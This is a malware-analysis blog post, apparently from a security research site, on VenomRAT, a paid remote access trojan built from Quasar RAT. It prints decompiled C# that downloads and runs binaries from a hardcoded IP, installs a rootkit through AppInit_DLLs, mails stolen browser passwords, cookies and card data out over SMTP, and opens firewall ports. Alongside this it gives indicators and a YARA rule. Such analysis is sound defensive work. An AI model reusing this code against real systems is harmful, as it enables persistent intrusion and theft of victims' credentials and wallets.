<!DOCTYPE html>
<html>
<head>
    
        
<meta charset="utf-8">
<meta name="HandheldFriendly" content="True">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer-when-downgrade">

<title>VenomRAT - new, hackforums grade, reincarnation of QuasarRAT   - MalwareLab.pl Research Notes</title>
<meta name="description" content="">

<link rel="alternate" type="application/rss+xml" title="RSS" href="https://blog.malwarelab.pl/rss/">

<link rel="icon" type="image/x-icon" href="https://blog.malwarelab.pl/favicon.ico">
<link rel="apple-touch-icon-precomposed" href="https://blog.malwarelab.pl/favicon.png">

<link rel="stylesheet" href="https://blog.malwarelab.pl/static/css/style.css?rnd=1593086112" />

<meta property="og:title" content="VenomRAT - new, hackforums grade, reincarnation of QuasarRAT " />
<meta property="og:description" content="Intro During routine hunting we stumble upon new Remote Administration Toolkit (RAT), named Venom RAT. Like with many such tools authors are conducting their business under false pretense of providing a tool to remotely manage your own computers.
A one can see on a screen-shot above, this tool posses essential capabilities to manage your own computers such as
 Keyloger Stealer UAC Bypass Password Recovery (sealing)  All those for small price of 150$ per month." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.malwarelab.pl/posts/venom/" />
<meta property="article:published_time" content="2020-06-22T22:19:59+02:00" />
<meta property="article:modified_time" content="2020-06-22T22:19:59+02:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="VenomRAT - new, hackforums grade, reincarnation of QuasarRAT "/>
<meta name="twitter:description" content="Intro During routine hunting we stumble upon new Remote Administration Toolkit (RAT), named Venom RAT. Like with many such tools authors are conducting their business under false pretense of providing a tool to remotely manage your own computers.
A one can see on a screen-shot above, this tool posses essential capabilities to manage your own computers such as
 Keyloger Stealer UAC Bypass Password Recovery (sealing)  All those for small price of 150$ per month."/>








    
</head>
<body>
    <div class="container">
        <header> 
            
                <h1 class="site-header">
    <a href="https://blog.malwarelab.pl">MalwareLab.pl Research Notes</a>
</h1>
<nav>
    
    
</nav>

            
        </header>
        <main>
            

    <article class="post">
        <header>
            <h1>VenomRAT - new, hackforums grade, reincarnation of QuasarRAT </h1>
        </header>
        <div class="content">
            <h1 id="intro">Intro</h1>
<p>During routine hunting we stumble upon new Remote Administration Toolkit (RAT), named Venom RAT. Like with many such tools authors are conducting their business under false pretense of providing a tool to remotely manage your own computers.</p>
<p><img src="/static/blog/img/venom_offer.png" alt=""></p>
<p>A one can see on a screen-shot above, this tool posses essential capabilities to manage your own computers such as</p>
<ul>
<li>Keyloger</li>
<li>Stealer</li>
<li>UAC Bypass</li>
<li>Password Recovery (sealing)</li>
</ul>
<p>All those for small price of 150$ per month.<br>
What we get for it? Let&rsquo;s find out.</p>
<h1 id="technical-details1">Technical Details<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></h1>
<p>This RAT is a revamped version of infamous Quasar RAT, most likely based on <a href="https://github.com/mirkoBastianini/Quasar-RAT/">this</a> fork. Following new commands where added</p>
<ul>
<li>DoInstallVNC</li>
<li>DoInstallRDP</li>
<li>DoStealer</li>
<li>DoRemoveVnc</li>
<li>DoRemoveRdp</li>
<li>GetVncInfo</li>
<li>GetRdpInfo</li>
<li>GetAllPasswords</li>
</ul>
<p>On top of that an rootkit was added to help hide malicious software. This adds following capabilities to already extensive list of what Quasar RAT can do.</p>
<ul>
<li>Rootkit hiding processes and files</li>
<li>VNC connection</li>
<li>RDP connection</li>
<li>Generic Stealer</li>
</ul>
<p>Nothing particularly groundbreaking, but the way authors decide to implement it is quite shocking, as none of those extensions are part of a malware binary. Instead new executable is downloaded from hardcoded address and run</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Ngrok(<span style="color:#66d9ef">string</span> token)
		{
			<span style="color:#66d9ef">try</span>
			{
				StreamWriter streamWriter = <span style="color:#66d9ef">new</span> StreamWriter(Path.Combine(Path.GetTempPath(), <span style="color:#e6db74">&#34;rdp.bat&#34;</span>));
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;set downloadURL=http://91.134.207.16/ngrok.exe&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;set logFile=%TEMP%\\proclog.txt&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;set exeFile=%TEMP%\\ngrok.exe&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://91.134.207.16/ngrok.exe&#39;,&#39;%exeFile%&#39;);&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;%exeFile% authtoken &#34;</span> + token);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;%exeFile%  tcp  3389 &gt; %logFile%&#34;</span>);
				streamWriter.Close();
				<span style="color:#66d9ef">string</span> fileName = Path.Combine(Path.GetTempPath(), <span style="color:#e6db74">&#34;rdp.bat&#34;</span>);
				Process.Start(<span style="color:#66d9ef">new</span> ProcessStartInfo
				{
					FileName = fileName,
					CreateNoWindow = <span style="color:#66d9ef">true</span>,
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = <span style="color:#66d9ef">true</span>,
					ErrorDialog = <span style="color:#66d9ef">false</span>
				});
				Thread.Sleep(<span style="color:#ae81ff">30000</span>);
				module2.geturl();
			}
			<span style="color:#66d9ef">catch</span> (Exception)
			{
			}
		}
</code></pre></div><h2 id="rootkit-dc6ce53e100795c72f4db35a8cfd9294cc564cd82c8f59468fa94c7c0cf0b0de">Rootkit (dc6ce53e100795c72f4db35a8cfd9294cc564cd82c8f59468fa94c7c0cf0b0de)</h2>
<p>Following code is responsible for fetching and installing DLL containing a root-kit,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Install(<span style="color:#66d9ef">bool</span> is64bit)
		{
			<span style="color:#66d9ef">string</span> path = Path.Combine(Settings.DIRECTORY, Settings.SUBDIRECTORY);
			<span style="color:#66d9ef">if</span> (root.IsAdmin())
			{
				<span style="color:#66d9ef">string</span> link = <span style="color:#e6db74">&#34;https://payloads-poison.000webhostapp.com/r77-x64.dll&#34;</span>;
				<span style="color:#66d9ef">string</span> link2 = <span style="color:#e6db74">&#34;https://payloads-poison.000webhostapp.com/r77-x86.dll&#34;</span>;
				<span style="color:#66d9ef">string</span> name = <span style="color:#e6db74">&#34;r77-x64.dll&#34;</span>;
				<span style="color:#66d9ef">string</span> name2 = <span style="color:#e6db74">&#34;r77-x86.dll&#34;</span>;
				module2.download(link, name);
				module2.download(link2, name2);
				<span style="color:#66d9ef">string</span> text = <span style="color:#e6db74">&#34;x&#34;</span> + (is64bit ? <span style="color:#ae81ff">64</span> : <span style="color:#ae81ff">86</span>).ToString() + <span style="color:#e6db74">&#34;.dll&#34;</span>;
				<span style="color:#66d9ef">string</span> text2 = Path.Combine(Path.GetTempPath(), <span style="color:#e6db74">&#34;$77-&#34;</span> + Guid.NewGuid().ToString(<span style="color:#e6db74">&#34;N&#34;</span>) + <span style="color:#e6db74">&#34;-&#34;</span> + text);
				File.Copy(Path.Combine(path, <span style="color:#e6db74">&#34;r77-&#34;</span> + text), text2);
				<span style="color:#66d9ef">new</span> FileInfo(text2).Attributes |= FileAttributes.Temporary;
				<span style="color:#66d9ef">using</span> (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey(<span style="color:#e6db74">&#34;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&#34;</span>, <span style="color:#66d9ef">true</span>))
				{
					registryKey.SetValue(<span style="color:#e6db74">&#34;LoadAppInit_DLLs&#34;</span>, <span style="color:#ae81ff">1</span>);
					registryKey.SetValue(<span style="color:#e6db74">&#34;RequireSignedAppInit_DLLs&#34;</span>, <span style="color:#ae81ff">0</span>);
					registryKey.SetValue(<span style="color:#e6db74">&#34;AppInit_DLLs&#34;</span>, text2);
				}
				<span style="color:#66d9ef">string</span> path2 = Path.Combine(path, <span style="color:#e6db74">&#34;r77-x64.dll&#34;</span>);
				<span style="color:#66d9ef">string</span> path3 = Path.Combine(path, <span style="color:#e6db74">&#34;r77-x86.dll&#34;</span>);
				File.SetAttributes(path2, FileAttributes.Hidden);
				File.SetAttributes(path3, FileAttributes.Hidden);
				<span style="color:#66d9ef">return</span>;
			}
			<span style="color:#66d9ef">string</span> link3 = <span style="color:#e6db74">&#34;https://payloads-poison.000webhostapp.com/r77-x64.dll&#34;</span>;
			<span style="color:#66d9ef">string</span> link4 = <span style="color:#e6db74">&#34;https://payloads-poison.000webhostapp.com/r77-x86.dll&#34;</span>;
			<span style="color:#66d9ef">string</span> name3 = <span style="color:#e6db74">&#34;r77-x64.dll&#34;</span>;
			<span style="color:#66d9ef">string</span> name4 = <span style="color:#e6db74">&#34;r77-x86.dll&#34;</span>;
			module2.download(link3, name3);
			module2.download(link4, name4);
			<span style="color:#66d9ef">string</span> text3 = <span style="color:#e6db74">&#34;x&#34;</span> + (is64bit ? <span style="color:#ae81ff">64</span> : <span style="color:#ae81ff">86</span>).ToString() + <span style="color:#e6db74">&#34;.dll&#34;</span>;
			<span style="color:#66d9ef">string</span> text4 = Path.Combine(Path.GetTempPath(), <span style="color:#e6db74">&#34;$77-&#34;</span> + Guid.NewGuid().ToString(<span style="color:#e6db74">&#34;N&#34;</span>) + <span style="color:#e6db74">&#34;-&#34;</span> + text3);
			File.Copy(Path.Combine(path, <span style="color:#e6db74">&#34;r77-&#34;</span> + text3), text4);
			<span style="color:#66d9ef">new</span> FileInfo(text4).Attributes |= FileAttributes.Temporary;
			<span style="color:#66d9ef">using</span> (RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey(<span style="color:#e6db74">&#34;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&#34;</span>, <span style="color:#66d9ef">true</span>))
			{
				registryKey2.SetValue(<span style="color:#e6db74">&#34;LoadAppInit_DLLs&#34;</span>, <span style="color:#ae81ff">1</span>);
				registryKey2.SetValue(<span style="color:#e6db74">&#34;RequireSignedAppInit_DLLs&#34;</span>, <span style="color:#ae81ff">0</span>);
				registryKey2.SetValue(<span style="color:#e6db74">&#34;AppInit_DLLs&#34;</span>, text4);
			}
			<span style="color:#66d9ef">string</span> path4 = Path.Combine(path, <span style="color:#e6db74">&#34;r77-x64.dll&#34;</span>);
			<span style="color:#66d9ef">string</span> path5 = Path.Combine(path, <span style="color:#e6db74">&#34;r77-x86.dll&#34;</span>);
			File.SetAttributes(path4, FileAttributes.Hidden);
			File.SetAttributes(path5, FileAttributes.Hidden);
		}
</code></pre></div><p>Code of this rootkit can be found on github, <a href="https://github.com/bytecode77/r77-rootkit">https://github.com/bytecode77/r77-rootkit</a>. This rootkit will hide anything (process, files, etc) with prefix <code>$77</code> hence names of running VenomRAT binaries will start with <code>$77</code> this is also clearly visible in project files, for example in <code>.csproj</code> which is a part of every C# project and describes its basic properties.</p>
<pre><code>    &lt;RootNamespace&gt;$77-Venom&lt;/RootNamespace&gt;
    &lt;AssemblyName&gt;$77-Venom&lt;/AssemblyName&gt;
</code></pre><p>In addition to DLL being fetched from interent, 2 more binaries are extracted form resources and dropped</p>
<ul>
<li>Chrome - 1bb6f045a9218bacd2c0f35f2e9fb3f0a92f5bdd7efd207b070c47707a6ae82d, a tool based on <a href="https://github.com/rvrsh3ll/UACSilentCleanup">UACSilentCleanup</a> used to bypass UAC</li>
<li>Install - 74f157d228b19efbe878feb76a5be3caeb1cdd11c59ee3ec9622dbd994081310, installer for r77 rootkit, will add r77-x86.dl and r77-x64.dll into <code>AppInit_Dlls</code> auto-load mechanism.</li>
</ul>
<h2 id="stealer-f053af636e8ec15d133a92aceb4187027aa7a8d4e91e8217e87155037fbdc6ef">Stealer (f053af636e8ec15d133a92aceb4187027aa7a8d4e91e8217e87155037fbdc6ef)</h2>
<p>Probably author&rsquo;s own creation named by them as <strong>Velos Stealer</strong> is a very simple C# program capable of stealing fallowing data,</p>
<ul>
<li>Files on desktop (with extensions .doc, .docx, .txt and .log)</li>
<li>Info about used ftp servers from FileZilla (filezilla_recentservers.xml, filezilla_sitemanager.xml)</li>
<li>Crypto currency wallets (BitcoinCore, Electrum, LTC, ETH, DSH, XMR, ZEC<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>)</li>
<li>Saved password from browsers</li>
<li>Saved credit card data from browsers</li>
<li>Saved cookies from browsers</li>
<li>Cached forms auto-filled by browsers</li>
</ul>
<p>stolen data will saved into separate files (<code>Passwords.txt</code>, <code>Cookies.txt</code>, <code>CC.txt</code>, <code>Autofill.txt</code>)  and later compressed into <code>Passwords.zip</code></p>
<h2 id="vnc-517e1659c9d9ee4de266b3ade2d06965b670d17082ae2c2c97b4c694bb29152a">VNC (517e1659c9d9ee4de266b3ade2d06965b670d17082ae2c2c97b4c694bb29152a)</h2>
<p>This file its a UltraVNC, packed with UPX and wrapped into some sort of installer. As in most cases installation will be done intermediary ad-hoc created .bat script</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">			StreamWriter streamWriter = <span style="color:#66d9ef">new</span> StreamWriter(Path.Combine(Path.GetTempPath(), <span style="color:#e6db74">&#34;dvnc.bat&#34;</span>));
			streamWriter.WriteLine(<span style="color:#e6db74">&#34;set logFile=%TEMP%\\proclog.txt&#34;</span>);
			streamWriter.WriteLine(<span style="color:#e6db74">&#34;set exeFile=%TEMP%\\Install.exe&#34;</span>);
			streamWriter.WriteLine(<span style="color:#e6db74">&#34;set logFile=%TEMP%\\proclog.txt&#34;</span>);
			streamWriter.WriteLine(<span style="color:#e6db74">&#34;powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://91.134.207.16/Install.exe&#39;,&#39;%exeFile%&#39;);&#34;</span>);
</code></pre></div><h2 id="rdp">RDP</h2>
<p>In order to install RDP on victims computer few scripts and binaries will be downloaded and run.</p>
<table>
<thead>
<tr>
<th>Hosting URL</th>
<th>File Name</th>
<th>SHA256</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>hxxp://91.134.207[.]16/rdpinstall.exe</code></td>
<td>installrdp.exe</td>
<td><code>28d7a2216d76d1420f14c4aea0cc466d49674c9c17d078d365cc346a560b79a1</code></td>
<td>Custom droper that will drop <code>UACMe</code> and <code>RDP Wrapper</code><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></td>
</tr>
<tr>
<td><code>hxxp://91.134.207[.]16/autoupdate1.exe</code></td>
<td>autoupdate1.exe</td>
<td><code>ba3354e03dbb64b11989acc4593d7103097083c128f3bca86bfb8776cb279001</code></td>
<td>SFX archive with bunch of scripts calling each other in order to run <code>autoupdate.bat</code><sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></td>
</tr>
<tr>
<td><code>hxxp://91.134.207[.]16/autoupdate2.exe</code></td>
<td>autoupdate2.exe</td>
<td><code>c1bf6f0dca24c0f99e8f0998c45b5a1c21b68cb98507210a303abee7abba8b29</code></td>
<td>SFX archive with bunch of scripts calling each other in order to run <code>autoupdate.bat</code></td>
</tr>
<tr>
<td><code>http://91.134.207.16/update.exe</code></td>
<td>updaterdp.exe</td>
<td><code>57aece1eeca1ac5f5ccf23bb06b30b56c7339fe434c1c33d86a9c0fa44e1cad5</code></td>
<td>SFX archive containing installer for <code>RDP Wrapper</code></td>
</tr>
</tbody>
</table>
<p>Before those files will be run, some steps are taken to prepare environment, more precisely,</p>
<ul>
<li>Cleanup; all files from %TEMP% are removed and processes named <code>cmd</code>, <code>conhost</code>, <code>installrdp</code>, <code>installrdp</code>, <code>updaterdp</code>, <code>Install</code>, <code>winvnc</code> are killed</li>
<li>Remote Desktop is enabled by manipulating registry keys</li>
<li>access to Remote Desktop port is enabled on firewall</li>
<li><code>%ProgramFiles%\\RDP Wrapper</code> is added to a list of paths ignored by Windows Defender.</li>
<li>User <code>Venom</code> with password <code>Venom</code> is added as an administrator with ability to use Remote Desktop</li>
</ul>
<h2 id="ngrok">Ngrok</h2>
<p>Both are <strong>RDP</strong> and <strong>VNC</strong> are tunneled by <strong>ngrok.io</strong> network, in order to achieve that ngrok client is being downloaded from <code>hxxp://91.134.207[.]16/ngrok.exe</code> and another utility named <code>getrdp.exe</code> (from <code>hxxp://91.134.207[.]16/getrdp.exe</code>)<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup> is used to enumerate available tunnels and send that data back to c2. <code>getrdp.exe</code> is a another SFX archive, this time containing <code>curl.exe</code> and <code>jq.exe</code>, both benign tools.</p>
<h2 id="ex-filtration">Ex-filtration</h2>
<p>Authors decided to implement an unusual strategy of ex-filtrating stolen data, first a file is put onto FTP server using WinSCP client and later an email with a file attached is being send. Credentials needed for authorization to ftp and smtp server are send in a command initiating data stealing.</p>
<h3 id="ftp-ex-filtration">FTP ex-filtration</h3>
<p>In the code one can find actually two function responsible for uploading data onto FTP server, one using pure powershell and other aforementioned WinSCP.com</p>
<h3 id="smtp-ex-filtration">SMTP ex-filtration</h3>
<p>In similar fashion to FTP, malware has a two function for sending emails, one relaying on powershell and second on <code>blat.exe</code><sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup>, powershell method will write a script into <code>%TEMP%\send.ps1</code>.</p>
<h3 id="exfiltrantion-via-ngrok">Exfiltrantion via Ngrok</h3>
<p>For both FTP and SMTP, designated way supposed to be a Ngrok tunnel, however authors don&rsquo;t really understand how tunneling works and are oblivious for a fact that you need a SMTP/FTP service on a machine to be able to use it, and when you are tunneling traffic via 3rd party service you don&rsquo;t need to open any ports</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> SendFile(<span style="color:#66d9ef">string</span> filepath, <span style="color:#66d9ef">string</span> email, <span style="color:#66d9ef">string</span> toemail, <span style="color:#66d9ef">string</span> password, <span style="color:#66d9ef">string</span> token)
		{
			module2.fixports();
			module2.sendfuckingemail(token);
			<span style="color:#66d9ef">try</span>
			{
				StreamWriter streamWriter = <span style="color:#66d9ef">new</span> StreamWriter(Path.Combine(Path.GetTempPath(), <span style="color:#e6db74">&#34;send.ps1&#34;</span>));
				Path.Combine(Path.GetTempPath(), <span style="color:#e6db74">&#34;blat.exe&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;$SMTPServer = &#39;smtp.gmail.com&#39;;&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;$SMTPInfo.EnableSsl = $true;&#34;</span>);
				streamWriter.WriteLine(<span style="color:#66d9ef">string</span>.Concat(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">string</span>[]
				{
					<span style="color:#e6db74">&#34;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential(&#39;&#34;</span>,
					email,
					<span style="color:#e6db74">&#34;&#39;, &#39;&#34;</span>,
					password,
					<span style="color:#e6db74">&#34;&#39;);&#34;</span>
				}));
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;$ReportEmail = New-Object System.Net.Mail.MailMessage;&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;$ReportEmail.From = &#39;&#34;</span> + email + <span style="color:#e6db74">&#34;&#39;;&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;$ReportEmail.To.Add(&#39;&#34;</span> + toemail + <span style="color:#e6db74">&#34;&#39;);&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;$ReportEmail.Subject = &#39;Velos Stealer Report&#39;;&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;$ReportEmail.Body = &#39;Velos Stealer report in the attachments.&#39;;&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;$ReportEmail.Attachments.Add(&#39;&#34;</span> + filepath + <span style="color:#e6db74">&#34;&#39;);&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;$SMTPInfo.Send($ReportEmail);&#34;</span>);
				streamWriter.Close();
				Thread.Sleep(<span style="color:#ae81ff">5000</span>);
				<span style="color:#66d9ef">string</span> str = Path.Combine(Path.GetTempPath(), <span style="color:#e6db74">&#34;send.ps1&#34;</span>);
				Process.Start(<span style="color:#66d9ef">new</span> ProcessStartInfo
				{
					FileName = <span style="color:#e6db74">&#34;cmd&#34;</span>,
					Arguments = <span style="color:#e6db74">&#34;/k start /b powershell -ExecutionPolicy Bypass &#34;</span> + str + <span style="color:#e6db74">&#34;; &amp; exit&#34;</span>,
					CreateNoWindow = <span style="color:#66d9ef">true</span>,
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = <span style="color:#66d9ef">true</span>,
					ErrorDialog = <span style="color:#66d9ef">false</span>
				}).WaitForExit();
				Thread.Sleep(<span style="color:#ae81ff">40000</span>);
				module2.killpro();
				Module1.cleantemp();
			}
			<span style="color:#66d9ef">catch</span> (Exception)
			{
			}
		}

		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> sendfuckingftp(<span style="color:#66d9ef">string</span> token)
		{
			<span style="color:#66d9ef">try</span>
			{
				StreamWriter streamWriter = <span style="color:#66d9ef">new</span> StreamWriter(Path.Combine(Path.GetTempPath(), <span style="color:#e6db74">&#34;fixftp.bat&#34;</span>));
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;set downloadURL=http://91.134.207.16/ngrok.exe&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;set logFile=%TEMP%\\proclog.txt&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;set exeFile=%TEMP%\\ngrok.exe&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;set logFile=%TEMP%\\proclog.txt&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;powershell (new-object System.Net.WebClient).DownloadFile(&#39;%downloadURL%&#39;,&#39;%exeFile%&#39;);&#34;</span>);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;%exeFile% authtoken &#34;</span> + token);
				streamWriter.WriteLine(<span style="color:#e6db74">&#34;%exeFile%  tcp  21 &gt; %logFile%&#34;</span>);
				streamWriter.Close();
				<span style="color:#66d9ef">string</span> fileName = Path.Combine(Path.GetTempPath(), <span style="color:#e6db74">&#34;fixftp.bat&#34;</span>);
				Process.Start(<span style="color:#66d9ef">new</span> ProcessStartInfo
				{
					FileName = fileName,
					CreateNoWindow = <span style="color:#66d9ef">true</span>,
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = <span style="color:#66d9ef">true</span>,
					ErrorDialog = <span style="color:#66d9ef">false</span>
				});
			}
			<span style="color:#66d9ef">catch</span> (Exception)
			{
			}
		}

				<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> fixports()
		{
			Process.Start(<span style="color:#66d9ef">new</span> ProcessStartInfo
			{
				FileName = <span style="color:#e6db74">&#34;cmd&#34;</span>,
				Arguments = <span style="color:#e6db74">&#34;/k start /b netsh advfirewall firewall add rule name=SMTP1 dir=in action=allow protocol=TCP localport=21 &amp; exit&#34;</span>,
				CreateNoWindow = <span style="color:#66d9ef">true</span>,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = <span style="color:#66d9ef">true</span>,
				ErrorDialog = <span style="color:#66d9ef">false</span>
			});

		....
</code></pre></div><h1 id="conclusion">Conclusion</h1>
<p>VenomRAT is yet another RAT published on hackforums, an infamous hatchery of incapable hackers-wannabes. While author has some interesting ideas he&rsquo;s lack of programing skills and understanding of how system and networks work prevents him from fully implement it. Besides all of those shortcomings (or maybe due to them) it generates quite a buzz on a forum,</p>
<p><img src="/static/blog/img/venom_talks.png" alt=""></p>
<p>While Qusar RAT and it forks are used by few actors, including APT33, Dropping Elephant, Stone Panda, The Gorgon Group<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup>, it is very unlikely that this tool will be ever used by any serious threat actor.<br>
With a price of 150$ per month doesn&rsquo;t sound like an option for aspiring criminals either, however we found quite a few samples ITW and are waiting with impatience for an upgrades that will fix all of the errors and misconceptions.
For now it just an another examples of company selling malicious software under a umbrella of elaborate TOS.</p>
<p><img src="/static/blog/img/venom_tos.png" alt=""></p>
<h1 id="analysis-artifacts">Analysis Artifacts</h1>
<h2 id="yara">Yara</h2>
<pre><code class="language-yara" data-lang="yara">
rule VenomRAT {

   meta:
      reference = &quot;https://blog.malwarelab.pl/posts/venom/&quot;
      author = &quot;Maciej Kotowicz, <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b8d5d9d3f8d5d9d4cfd9caddd4d9da96c8d4">[email&#160;protected]</a>&quot;
      copyright = &quot;MalwareLab.pl&quot;
      date = &quot;2020-06-10&quot;
      hash = &quot;7128a2488b2d0084465ca1602a844eafb191de938fc70098d86cb65d17734778&quot;
      hash = &quot;95cc84715a64ff8271814d69dc2c71d8ec22476a1d580d645e1a9dba625a789c&quot;
      hash = &quot;74cbcffcfa82c021f1ed8f403b80ea2047f4f0d9238ab31560348910b5dcbc4f&quot;
   strings:
      $a0 = &quot;[-] Unable to Create the Enviroment Variabled %windir%.&quot; wide
      $a1 = &quot;Velos Stealer Report &gt;&gt; %PSScript%&quot; wide
      $a2 = &quot;Checking if itadmin is part of Administrators Group&quot; wide
      $a3 = &quot;/k start /b wusa /uninstall /kb:4471332 /quiet &amp; exit&quot; wide
      $a4 = &quot;[+] Waiting 5 seconds before execution.&quot; wide
   condition:
      2 of them

}

</code></pre><h2 id="hashes">Hashes</h2>
<p>Full list of hashes can be found on our <a href="https://github.com/malwarelab-pl/ioc/blob/master/venom/">github</a></p>
<h2 id="c2-servers">C2 Servers</h2>
<p>Full list of hashes can be found on our <a href="https://github.com/malwarelab-pl/ioc/blob/master/venom/">github</a></p>
<h2 id="campaigns-tags">Campaigns Tags</h2>
<pre><code>$77payload
Afro
Application
AYUb
Client
ctOS_Users
Discord
Fatality
Forthack
FPSBooster
Friends
Hacked by Seliax
Husky
idiot
Idiot
Java Updater
Joel
LoL Checker
Lunar Xray
Marisa
Marisa1
Minecraft Launcher
mp4
Office04
Office05
Office1
Office2016
OfficePacket004
OfficeXS20
Opfer
Otohits
PC1
PrimoTest
Rayan
REAL
retarded
Search
Start
test
Test
Test01
testme
ValorantChecker
Venom
Venom Client
Venom Slave
Venom Test
Victimes
X_Ray
Chrome
Chrome_Update
Zombie
</code></pre><h2 id="mutexes">Mutexes</h2>
<p>all mutexes can be described with following regex:  <code>VNM_MUTEX_[a-zA-Z]{18}</code></p>
<h2 id="filenames">Filenames</h2>
<pre><code>$$77Antimalware.exe
$77$test!.exe
$77ashapayload.exe
$77-chrome.exe
$77client.exe
$77Client!.exe
$77Client.exe
$77driverD.exe
$77Java_Updater.exe
$77nordvpn.exe
$77-Office.exe
$77Steem.exe
$77TeksurnaGrafika.exe
$77TestC.exe
$77Test.exe
$77-venom.exe
$77WinSheduler.exe
$77WinUpdate.exe
$77-winupdater.exe
$77XXX.exe
$ClientRun.exe
Client.exe
Clientuisis.exe
Dllhost.exe
Forthack.exe
fSociety.exe
GoogleUpdaTes.exe
iusnBase.exe
Jai.exe
Microsoft.exe
MicrosoftUpdate.exe
MicrosoftWindowsGrahpy.exe
MUAHHA.exe
Office2016.exe
officeupdate.exe
Otohits.exe
ruby.exe
RuntimeBroker.exe
Search.exe
Self-Bot-github.exe
services.exe
SuperAdmin.exe
svchost.exe
Tarea.exe
telegram.exe
Updater.exe
Vega.exe
Venom.exe
venomkongregate.exe
WinDefend.exe
Windows Defender.exe
windowsoperator.exe
WindowsUpdate.exe
winsvr.exe
WndProc.exe
$77Your Phone.exe
Auxiliary Source
$77sys.exe
Z-Flix Cracked by Seliax.exe
</code></pre><section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Analysis was performed based on a debug build (<code>7128a2488b2d0084465ca1602a844eafb191de938fc70098d86cb65d17734778</code>) representing version 2.1.0.0, this version match all of them samples of this malware we found ITW <a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>This feature will be added probably in next version, for now function responsible for it is empty <a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p><a href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a> <a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4" role="doc-endnote">
<p><code>autoupdate.bat</code> is a legitimate file, part of <code>RDP Wrapper</code> that will add itself as scheduled task <a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
